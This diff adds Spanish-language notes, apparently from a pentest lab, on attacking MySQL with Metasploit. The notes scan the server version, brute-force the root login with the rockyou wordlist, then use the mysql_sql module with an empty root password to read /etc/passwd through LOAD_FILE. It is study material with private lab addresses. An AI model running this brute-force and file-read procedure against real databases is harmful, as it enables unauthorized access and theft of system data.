@@ -1,0 +1,66 @@
+## Primero buscamos un modulo auxiliar para escanear la versoin del mysql 
+
+search mysql_version
+
+## Selecionamos el siguiente 
+
+use auxiliary/scanner/mysql/mysql_version
+
+## Le agreamos la ip a escanear
+
+set rhosts 192.168.0.38
+
+## lo corremos 
+
+run 
+
+## Ahora buscamos el auxiliary para logearte
+
+search mysql_login
+
+## Seleccionamos el siguiente 
+
+use auxiliary/scanner/mysql/mysql_login
+
+## Vemos que parametros podemos modificar de la siguiente manera
+
+show options 
+
+## ahora vemos que podemos y modificamos
+
+msf auxiliary(mysql_login) > set THREADS 1000
+THREADS => 1000
+msf auxiliary(mysql_login) > set RHOSTS 10.0.0.27
+RHOST => 10.0.0.27
+msf auxiliary(mysql_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+PASS_FILE => /usr/share/wordlists/rockyou.txt
+msf auxiliary(mysql_login) > set USERNAME root
+USERNAME => root
+msf auxiliary(mysql_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf auxiliary(mysql_login) > set VERBOSE false
+VERBOSE => false
+msf auxiliary(mysql_login) > set BLANK_PASSWORDS true
+BLANK_PASSWORDS => true
+
+## Ahora le damos a run
+
+run 
+## ahora ponemos el siguiente comando 
+
+use auxiliary/admin/mysql/mysql_sql
+
+## le damos a show options y ponemos esto 
+
+SELECT LOAD_FILE('/etc/passwd')
+msf auxiliary(mysql_sql) > set USERNAME root
+USERNAME => root
+msf auxiliary(mysql_sql) > set PASSWORD ''
+PASSWORD => 
+msf auxiliary(mysql_sql) > set RHOST 10.0.0.27
+RHOST => 10.0.0.27
+msf auxiliary(mysql_sql) > set RPORT 3306
+RPORT => 3306
+msf auxiliary(mysql_sql) > set SQL select load_file(\'/etc/passwd\')
+SQL => select load_file('/etc/passwd')
+
